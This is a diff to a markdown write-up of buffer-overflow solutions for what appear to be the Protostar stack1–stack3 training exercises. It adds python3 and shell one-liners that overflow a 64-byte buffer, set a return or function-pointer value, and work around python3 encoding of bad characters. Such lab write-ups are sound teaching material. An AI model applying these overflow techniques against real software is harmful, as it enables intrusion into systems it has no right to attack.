@@ -8,6 +8,10 @@
     - [stack0 solution](#stack0-solution)
   - [stack1](#stack1)
     - [stack1 solution](#stack1-solution)
+  - [stack2](#stack2)
+    - [stack2 solution](#stack2-solution)
+  - [stack3 python3 encoding(bad characters)](#stack3-python3-encodingbad-characters)
+    - [stack3 solution](#stack3-solution)
 
 ## stack0
 
@@ -66,5 +70,49 @@ info registers    # eax 0x45444342
 ### stack1 solution
 
 ```sh
-./stack1 $(python3 -c "print(b'A' * 62 + b'\x64\x63\x62\x61')")
+# ./stack1 $(python3 -c "print(b'A' * 62 + b'\x64\x63\x62\x61')")
+./stack1 $(python3 -c "print('A' * 64 + '\x64\x63\x62\x61')")
+```
+
+## stack2
+
+```gdb
+b *main+84
+```
+
+### stack2 solution
+
+```sh
+GREENIE=$(python3 -c "print('A' * 64 + '\x0a\x0d\x0a\x0d')");export GREENIE;printenv GREENIE;
+  # if use b'', the \x0a will be literally parsed as '\' 'x' '0' 'a'
+./stack2
+```
+
+## stack3 python3 encoding(bad characters)
+
+```asm
+  0x08048475 <+61>:    call   eax 
+```
+
+- find out the target binary
+
+```sh
+objdump -d stack3 | grep win
+  # @ 0x08 04 84 24 
+```
+
+- redirect the `fp();` call. Problem: bad chars
+
+```gdb
+b *main + 61
+r <<< $(python3 -c "print('A' * 120)")
+r <<< $(python3 -c "print('A' * 64 + '\x24\x84\x04\x08')")
+  # bad chars. The '\x84' get parsed as '\xc2\x84' in python3. Possible UTF-8 <control> string.
+  # solution: use echo -e -n
+```
+
+### stack3 solution
+
+```sh
+./stack3 <<< $(python3 -c "print('A' * 64)"|xargs echo -en;echo -en '\x24\x84\x04\x08')
 ```
